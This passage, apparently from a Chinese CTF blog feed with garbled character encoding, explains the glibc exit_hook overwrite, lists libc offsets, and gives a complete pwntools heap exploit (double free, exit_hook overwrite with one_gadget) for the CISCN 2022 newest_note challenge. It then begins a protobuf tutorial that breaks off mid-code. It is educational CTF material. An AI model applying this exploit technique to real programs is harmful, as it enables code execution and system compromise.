å‡½æ•°</li></ul></blockquote><p>å†™ä¸ªç®€å•è°ƒè¯•ä»£ç    ï¼Œ æ¥çœ‹çœ‹exitæ˜¯æ€ä¹ˆå·¥ä½œçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¿›å…¥__run_exit_handlers</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101909876.png" alt="image-20241210190959738"></p><p>è¿™é‡Œä¼šè°ƒç”¨åˆ°**_dl_finiå‡½æ•°** ï¼Œè¿›å…¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101912407.png" alt="image-20241210191211314"></p><p>_dl_finiå‡½æ•°å¼€å¤´çš„forå¾ªç¯ä¸­å°±è°ƒç”¨åˆ°äº†<strong>rtld_lock_default_lock_recursiveå‡½æ•°</strong> ï¼Œå¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°çš„åœ°å€æ˜¯ç›´æ¥é€šè¿‡*(rip + åç§»)æ‹¿åˆ°çš„ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101922330.png" alt="image-20241210192203250"></p><p>æ¥çœ‹ä¸€ä¸‹_dl_finiæºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_dl_fini (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-comment">/* Lots of fun ahead.  We have to call the destructors for all still</span><br><span class="hljs-comment">     loaded objects, in all namespaces.  The problem is that the ELF</span><br><span class="hljs-comment">     specification now demands that dependencies between the modules</span><br><span class="hljs-comment">     are taken into account.  I.e., the destructor for a module is</span><br><span class="hljs-comment">     called before the ones for any of its dependencies.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     To make things more complicated, we cannot simply use the reverse</span><br><span class="hljs-comment">     order of the constructors.  Since the user might have loaded objects</span><br><span class="hljs-comment">     using `dlopen&#x27; there are possibly several other modules with its</span><br><span class="hljs-comment">     dependencies to be taken into account.  Therefore we have to start</span><br><span class="hljs-comment">     determining the order of the modules once again from the beginning.  */</span><br><br>  <span class="hljs-comment">/* We run the destructors of the main namespaces last.  As for the</span><br><span class="hljs-comment">     other namespaces, we pick run the destructors in them in reverse</span><br><span class="hljs-comment">     order of the namespace ID.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-type">int</span> do_audit = <span class="hljs-number">0</span>;<br> again:<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="hljs-number">1</span>; ns &gt;= <span class="hljs-number">0</span>; --ns)<br>    &#123;<br>      <span class="hljs-comment">/* Protect against concurrent loads and unloads.  */</span><br>      __rtld_lock_lock_recursive (GL(dl_load_lock)); <span class="hljs-comment">// è¿™é‡Œç›´æ¥è°ƒç”¨æ²¡æœ‰åˆ¤æ–­æ¡ä»¶</span><br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;<br>      <span class="hljs-comment">/* No need to do anything for empty namespaces or those used for</span><br><span class="hljs-comment"> auditing DSOs.  */</span><br>      <span class="hljs-keyword">if</span> (nloaded == <span class="hljs-number">0</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  )<br>__rtld_lock_unlock_recursive (GL(dl_load_lock)); <span class="hljs-comment">// è¿™é‡Œæœ‰ä¸€ä¸ªifåˆ¤æ–­æ¡ä»¶é€šè¿‡æ‰èƒ½è°ƒç”¨</span><br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-comment">/* Now we can allocate an array to hold all the pointers and</span><br><span class="hljs-comment">     copy the pointers in.  */</span><br>  <span class="hljs-keyword">struct</span> link_map *maps[nloaded];<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>  assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>    <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br>    <span class="hljs-keyword">if</span> (l == l-&gt;l_real)<br>      &#123;<br>assert (i &lt; nloaded);<br><br>maps[i] = l;<br>l-&gt;l_idx = i;<br>++i;<br><br><span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">   are not dlclose()ed from underneath us.  */</span><br>++l-&gt;l_direct_opencount;<br>      &#125;<br>  assert (ns != LM_ID_BASE || i == nloaded);<br>  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nmaps = i;<br><br>  <span class="hljs-comment">/* Now we have to do the sorting.  We can skip looking for the</span><br><span class="hljs-comment">     binary itself which is at the front of the search list for</span><br><span class="hljs-comment">     the main namespace.  */</span><br>  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br> <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br><br>  <span class="hljs-comment">/* We do not rely on the linked list of loaded object anymore</span><br><span class="hljs-comment">     from this point on.  We have our own list here (maps).  The</span><br><span class="hljs-comment">     various members of this list cannot vanish since the open</span><br><span class="hljs-comment">     count is too high and will be decremented in this loop.  So</span><br><span class="hljs-comment">     we release the lock so that some code which might be called</span><br><span class="hljs-comment">     from a destructor can directly or indirectly access the</span><br><span class="hljs-comment">     lock.  */</span><br>  __rtld_lock_unlock_recursive (GL(dl_load_lock)); <span class="hljs-comment">// è¿™é‡Œåœ¨elseé‡Œé¢ä¹Ÿæœ‰è°ƒç”¨</span><br>          Â·Â·Â·Â·Â·Â·Â·<br>      &#125;<br><br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œåªéœ€è¦è¦†ç›–__rtld_lock_lock_recursive å’Œ _rtld_lock_unlock_recursiveå…¶ä¸­ä¸€ä¸ªä¸ºone_gadgetå³å¯getshellï¼Œè¿™rdiå¯„å­˜å™¨çš„å€¼æˆ‘ä»¬æ§åˆ¶ä¸äº†ï¼Œé™¤éèƒ½ç”³è¯·åˆ°chunkï¼Œç„¶åå¾€ _rtld_local+2440ä¸Šé¢å†™â€&#x2F;bin&#x2F;shâ€çš„åœ°å€ï¼Œå¦åˆ™å°±åªèƒ½æ‰“one_gadgetã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›åç§»æ¯”èµ›æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨</p><p><strong>åœ¨libc-2.23ä¸­</strong><br><strong>exit_hook &#x3D; libc_base+0x5f0040+3848</strong></p><p><strong>exit_hook &#x3D; libc_base+0x5f0040+3856</strong></p><p><strong>åœ¨libc-2.27ä¸­</strong></p><p><strong>exit_hook &#x3D; libc_base+0x619060+3840</strong></p><p><strong>exit_hook &#x3D; libc_base+0x619060+3848</strong></p><p>è¿™æ ·ä¸€æ¥ï¼Œåªè¦çŸ¥é“libcç‰ˆæœ¬å’Œä»»æ„åœ°å€çš„å†™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™è¿™ä¸ªæŒ‡é’ˆï¼Œæ‰§è¡Œexitåå°±å¯ä»¥æ‹¿åˆ°shelläº†ï¼Œä¸æ‰§è¡Œä¹Ÿå¯ä»¥æ­£å¸¸ç»“æŸä¹Ÿä¼šè¿”å›è¿™ä¸ª</p><h2 id="glibc2-34"><a href="#glibc2-34" class="headerlink" title="glibc2.34"></a>glibc2.34</h2><p>åœ¨glibc2.34ä¸­exit_hookæ¯”è¾ƒéš¾æ‰¾ï¼Œç›¸å¯¹libcåŸºåœ°å€çš„åç§»çš„</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101940990.png" alt="image-20241210194035898"></p><h2 id="CISCN-2022-åˆèµ›-newest-note-NSSCTF"><a href="#CISCN-2022-åˆèµ›-newest-note-NSSCTF" class="headerlink" title="[CISCN 2022 åˆèµ›]newest_note | NSSCTF"></a>[<a href="https://www.nssctf.cn/problem/2351">CISCN 2022 åˆèµ›]newest_note | NSSCTF</a></h2><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><ol><li>åˆ©ç”¨å¼€å§‹å¯æ§åˆ¶å¤§å°ï¼Œç”³è¯·ä¸€ä¸ªå¤§äºTopChunkå¤§å°çš„chunkï¼Œç³»ç»Ÿä¼šè°ƒç”¨mmap åˆ†é…ï¼Œä¼šæ˜ å°„libcåœ°å€å¼€è¾Ÿå¤§å°ï¼Œå°±å¯ä»¥æ³„éœ²libcåœ°å€</li><li>åˆ©ç”¨fastbin è¿›è¡Œ double free ï¼Œ ç”³è¯·åˆ°exit_hookä½ç½®çš„chunk ï¼Œ ç”¨one_gadget</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./newest_note&#x27;</span><br>url = <span class="hljs-string">&#x27;node4.anna.nssctf.cn:28339&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;How many pages your notebook will be? :&quot;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0x40040000</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) :<br>  add(i , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>) :<br>  free(i)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>key = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lss(<span class="hljs-string">&quot;key&quot;</span>)<br><br>show(<span class="hljs-number">539034</span>) //è¿œç¨‹   æœ¬åœ°å’Œè¿™ä¸ªä¸ä¸€æ ·ï¼Œä¹Ÿæ˜¯çœ‹çš„å¤§ä½¬çš„åç§»<br>main_arena = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>libc_base = main_arena - <span class="hljs-number">0x218c60</span><br>exit_hook = libc_base + <span class="hljs-number">0x00000000021A6C0</span><br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>) :<br>  add(<span class="hljs-number">9</span> , <span class="hljs-string">b&#x27;b&#x27;</span>)<br><br>fake_fd = key ^ exit_hook<br>add(<span class="hljs-number">10</span> , p64(fake_fd))<br>add(<span class="hljs-number">11</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">12</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>one_gadget = [<span class="hljs-number">0xeeccc</span>,<span class="hljs-number">0xeeccf</span>,<span class="hljs-number">0xeecd2</span>]<br>execve = libc_base + one_gadget[<span class="hljs-number">0</span>]<br><br>add(<span class="hljs-number">13</span> , <span class="hljs-number">2</span> * p64(execve))<br>p.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;main_arena&quot;</span>)<br>lss(<span class="hljs-string">&quot;exit_hook&quot;</span>)<br><br>p.interactive()<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exit_hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ…è°ˆprotobuf</title>
    <link href="/2024/12/10/%E6%B5%85%E8%B0%88protobuf/"/>
    <url>/2024/12/10/%E6%B5%85%E8%B0%88protobuf/</url>
    
    <content type="html"><![CDATA[<h1 id="æµ…è°ˆprotobuf"><a href="#æµ…è°ˆprotobuf" class="headerlink" title="æµ…è°ˆprotobuf"></a>æµ…è°ˆprotobuf</h1><h2 id="protobufåœ¨linuxä¸‹çš„å®‰è£…"><a href="#protobufåœ¨linuxä¸‹çš„å®‰è£…" class="headerlink" title="protobufåœ¨linuxä¸‹çš„å®‰è£…"></a>protobufåœ¨linuxä¸‹çš„å®‰è£…</h2><h3 id="å®‰è£…protobuf"><a href="#å®‰è£…protobuf" class="headerlink" title="å®‰è£…protobuf"></a>å®‰è£…protobuf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/protocolbuffers/protobuf/releases/v3.6.1/protobuf-cpp-3.6.1.tar.gz<br>tar -xvzf protobuf-cpp-3.6.1.tar.gz<br>./configure<br>make<br><span class="hljs-built_in">sudo</span> make install<br><span class="hljs-built_in">sudo</span> ldconfig<br>protoc --version<br><br><span class="hljs-comment">##æŸ¥çœ‹protocåœ¨/usr/local/bin/åŠ¨æ€é“¾æ¥æ˜¯å¦æ­£ç¡®</span><br><span class="hljs-comment">## â¯ ldd protoc</span><br>linux-vdso.so.1 (0x00007ffc3b5ce000)<br>libprotoc.so.17 =&gt; /usr/local/lib/libprotoc.so.17 (0x00007f835e800000)<br>libstdc++.so.6 =&gt; /lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007f835e400000)<br>libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f835eb52000)<br>libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f835e000000)<br>libprotobuf.so.17 =&gt; /usr/local/lib/libprotobuf.so.17 (0x00007f835dc00000)<br>/lib64/ld-linux-x86-64.so.2 (0x00007f835eb8a000)<br>libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f835ea69000)<br>libz.so.1 =&gt; /lib/x86_64-linux-gnu/libz.so.1 (0x00007f835e7e4000)<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…Cç¼–è¯‘æ’ä»¶"><a href="#å®‰è£…Cç¼–è¯‘æ’ä»¶" class="headerlink" title="å®‰è£…Cç¼–è¯‘æ’ä»¶"></a>å®‰è£…Cç¼–è¯‘æ’ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/protobuf-c/protobuf-c<br>tar -xzvf protobuf-c.tar.gz<br><span class="hljs-built_in">cd</span> protobuf-c<br>./configure &amp;&amp; make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure><h2 id="protobufç»“æ„ä½“è§£æ"><a href="#protobufç»“æ„ä½“è§£æ" class="headerlink" title="protobufç»“æ„ä½“è§£æ"></a>protobufç»“æ„ä½“è§£æ</h2><p>ç¤ºä¾‹ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br>package p0ach1l<span class="hljs-comment">;</span><br>message devicemsg &#123;<br>  required sint64 actionid <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  required sint64 msgidx <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  required sint64 msgsize <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>  required bytes msgcontent <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">protoc <span class="hljs-params">--c_out=</span><span class="hljs-string">./</span> p0ach1l.proto <span class="hljs-comment">##C</span><br>protoc <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> p0ach1l.proto  <span class="hljs-comment">##python</span><br></code></pre></td></tr></table></figure><p>cè¯­è¨€ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶(.cå’Œ.h)</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101131658.png" alt="image-20241210113134556"></p><p>pythonç”Ÿæˆä¸€ä¸ªpyæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101132324.png" alt="image-20241210113228260"></p><p>ä¸‹é¢æ¥åˆ†æcè¯­è¨€ä¸‹ç¼–è¯‘çš„æ–‡ä»¶</p><h3 id="å‡½æ•°æ“ä½œ"><a href="#å‡½æ•°æ“ä½œ" class="headerlink" title="å‡½æ•°æ“ä½œ"></a>å‡½æ•°æ“ä½œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span><br><span class="hljs-comment">/* Generated from: p0ach1l.proto */</span><br><br><span class="hljs-comment">/* Do not generate deprecated warnings for self */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;p0ach1l.pb-c.h&quot;</span></span><br><span class="hljs-type">void</span>   p0ach1l__devicemsg__init  <span class="hljs-comment">/*åˆå§‹åŒ– P0ach1l__Devicemsg æ¶ˆæ¯ç»“æ„ã€‚è¯¥å‡½æ•°å°†ä¸€ä¸ªé™æ€çš„åˆå§‹åŒ–å€¼*/</span><br>                     (P0ach1l__Devicemsg         *message)<br>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-type">const</span> P0ach1l__Devicemsg init_value = P0ACH1L__DEVICEMSG__INIT;<br>  *message = init_value;<br>&#125;<br><span class="hljs-type">size_t</span> p0ach1l__devicemsg__get_packed_size<span class="hljs-comment">/*è¿”å› P0ach1l__Devicemsg æ¶ˆæ¯åœ¨åºåˆ—åŒ–ï¼ˆæ‰“åŒ…ï¼‰åçš„å­—èŠ‚å¤§å°*/</span><br>                     (<span class="hljs-type">const</span> P0ach1l__Devicemsg *message)<br>&#123;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  <span class="hljs-keyword">return</span> protobuf_c_message_get_packed_size ((<span class="hljs-type">const</span> ProtobufCMessage*)(message));<br>&#125;<br><span class="hljs-type">size_t</span> p0ach1l__devicemsg__pack<span class="hljs-comment">/*å°† P0ach1l__Devicemsg æ¶ˆæ¯æ‰“åŒ…æˆäºŒè¿›åˆ¶æ ¼å¼ï¼Œè¾“å‡ºåˆ° out æŒ‡å‘çš„ç¼“å†²åŒºã€‚*/</span><br>                     (<span class="hljs-type">const</span> 